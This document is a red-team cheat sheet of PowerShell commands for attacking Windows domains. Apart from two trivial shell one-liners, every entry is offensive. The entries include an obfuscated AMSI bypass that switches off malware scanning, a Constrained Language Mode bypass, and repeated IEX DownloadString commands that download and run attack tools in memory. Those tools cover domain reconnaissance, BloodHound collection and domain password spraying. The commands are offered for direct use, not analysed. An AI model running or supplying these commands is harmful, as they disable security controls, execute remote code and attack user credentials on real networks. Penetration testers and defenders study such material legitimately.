##### Add HTTP-text to line
~~~
awk  '{print "http://" $1}' urls.txt
~~~
##### Change permissions of folder (Linux)
~~~
sudo chmod +x $(find /PATH/)
~~~
##### BloodHound ingestor trough PowerShell
~~~
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound -LdapUsername "Username" -LdapPassword "Password" -Domain "Domain" -DomainController DC-ip -CollectionMethods All -OutputDirectory "C:\TEMP\"
~~~



# Bypasses
------------
##### Powershell CLM Bypass:
~~~
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe  -ExecutionPolicy bypass"
sleep 5
#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
~~~

##### Powershell Obfuscated AMSI Bypass:
~~~
$w='System.Management.Automation.A';$c='si';$m='Utils'
$assembly=[Ref].Assembly.GetType(('{0}m{1}{2}'-f$w,$c,$m))
$field=$assembly.GetField(('am{0}InitFailed'-f$c),'NonPublic,Static')
$field.SetValue($null,$true)
~~~

##### Powershell Modified AMSI .Net Bypass script - In Memory
~~~
IEX (New-Object Net.Webclient).DownloadString('https://gist.githubusercontent.com/shantanu561993/6483e524dc225a188de04465c8512909/raw/db219421ea911b820e9a484754f03a26fbfb9c27/AMSI_bypass_Reflection.ps1')
~~~

### Scripts - In Memory
-----------------------
~~~
# Host Recon
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1');
Invoke-HostRecon
~~~

##### Powerview
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
~~~

##### Spray
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/DomainPasswordSpray/master/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Domain <domain> -Password password
~~~
##### Sharphound
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -Domain <domain> -CollectionMethod All
~~~
